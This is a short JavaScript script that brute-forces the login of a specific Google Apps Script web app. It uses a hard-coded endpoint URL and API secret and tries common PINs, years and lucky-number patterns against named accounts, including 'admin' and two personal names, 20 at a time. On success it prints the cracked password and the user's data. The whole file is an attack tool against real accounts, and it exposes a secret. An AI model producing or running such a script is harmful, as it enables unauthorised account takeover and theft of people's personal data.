const API_URL = 'https://script.google.com/macros/s/AKfycbzMg1ilHtrHXvTboGF3K8v9AtkWyWCnEGxh_tbvb-PnGHT-vyug8o1pegN_bKUOX4B-4A/exec';
const API_SECRET = 'JANS_SECRET_2026';

async function tryLogin(loginId, password) {
  try {
    const res = await fetch(API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        fn: 'loginUser',
        args: [loginId, password],
        secret: API_SECRET
      })
    });
    const data = await res.json();
    const inner = data.data;
    if (data.success && inner && inner.success && inner.data && inner.data.ten) {
      return inner.data;
    }
  } catch (e) {
    // ignore
  }
  return null;
}

async function run() {
  const users = ['admin', 'Châu Vân', 'Minh Minh'];
  
  // Generate list of common passwords
  const passwords = new Set();
  
  // Basic sequences
  const basic = ['1234', '123456', '12345678', '0000', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999'];
  basic.forEach(p => passwords.add(p));
  
  // Years
  for (let year = 1970; year <= 2030; year++) {
    passwords.add(String(year));
  }
  
  // Double digits & Auspicious
  const extra = [
    '6868', '8686', '7979', '3939', '1122', '2233', '3344', '4455', '5566', '6677', '7788', '8899', '9900',
    '1212', '2323', '3434', '4545', '5656', '6767', '7878', '8989', '9090', '4321', '87654321', '654321'
  ];
  extra.forEach(p => passwords.add(p));
  
  const pwdList = Array.from(passwords);
  console.log(`Checking ${users.length} users against ${pwdList.length} common passwords...`);
  
  const concurrency = 20;
  for (const user of users) {
    console.log(`Checking user: ${user}`);
    for (let i = 0; i < pwdList.length; i += concurrency) {
      const batch = pwdList.slice(i, i + concurrency);
      const promises = batch.map(async (pwd) => {
        const userData = await tryLogin(user, pwd);
        if (userData) {
          console.log(`\n!!! SUCCESS !!!`);
          console.log(`User: ${user}`);
          console.log(`Password/PIN: ${pwd}`);
          console.log(`User Data: ${JSON.stringify(userData)}`);
          process.exit(0);
        }
      });
      await Promise.all(promises);
    }
  }
  console.log('Finished checking common passwords. None found.');
}

run();
